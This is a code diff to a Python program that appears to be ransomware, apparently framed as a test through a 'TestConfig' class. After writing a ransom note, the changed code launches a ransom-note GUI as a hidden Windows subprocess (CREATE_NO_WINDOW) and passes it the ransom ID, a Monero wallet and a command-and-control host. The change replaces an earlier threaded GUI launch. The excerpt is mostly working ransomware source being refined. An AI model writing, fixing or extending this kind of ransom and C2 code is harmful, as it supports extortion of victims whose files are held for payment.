@@ -16,6 +16,7 @@ import time
 import random
 import json
 import uuid
+import subprocess
 from datetime import datetime
 
 try:
@@ -218,40 +219,27 @@ Pay to decrypt.
         except Exception as e:
             TestConfig.log(f"[!] Could not write ransom file: {e}")
         
-        # Show professional GUI if available
-        if RANSOM_GUI_AVAILABLE:
-            try:
-                TestConfig.log("[+] Launching professional ransom GUI...")
-                # Import the fixed GUI version
-                from ransom_gui_v2 import RansomNoteGUI
-                
-                self.gui = RansomNoteGUI(
-                    ransom_id=self.ransom_id,
-                    monero_address=TestConfig.MONERO_WALLET,
-                    c2_host=TestConfig.C2_HOST,
-                    payment_check_callback=None
-                )
-                
-                # Run GUI directly in main thread (not in separate thread)
-                # This needs to be non-blocking, so run in thread but don't wait
-                import threading
-                gui_thread = threading.Thread(target=self.gui.run, daemon=True)
-                gui_thread.start()
-                
-                # Give GUI time to initialize
-                import time
-                time.sleep(0.5)
-                
-                TestConfig.log("[+] GUI displayed successfully")
-                return self.gui
-            except Exception as e:
-                TestConfig.log(f"[!] Professional GUI error: {e}")
-                import traceback
-                traceback.print_exc()
-                self._show_simple_popup(ransom_text)
-        else:
-            TestConfig.log("[!] Professional GUI not available")
-            self._show_simple_popup(ransom_text)
+        # Try to launch the GUI in a separate process (not thread!)
+        # This avoids tkinter apartment issues
+        try:
+            TestConfig.log("[+] Launching professional ransom GUI...")
+            import subprocess
+            gui_script = os.path.join(os.path.dirname(__file__), 'gui_launcher.py')
+            
+            # Pass ransom details to GUI launcher
+            subprocess.Popen([
+                sys.executable, 
+                gui_script,
+                self.ransom_id,
+                TestConfig.MONERO_WALLET,
+                TestConfig.C2_HOST
+            ], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
+            
+            TestConfig.log("[+] GUI process started")
+            return None
+        except Exception as e:
+            TestConfig.log(f"[!] Could not launch GUI process: {e}")
+            TestConfig.log("[+] Continuing without GUI overlay...")
     
     def _show_simple_popup(self, ransom_text):
         """Show simple GUI ransom note popup (fallback)"""
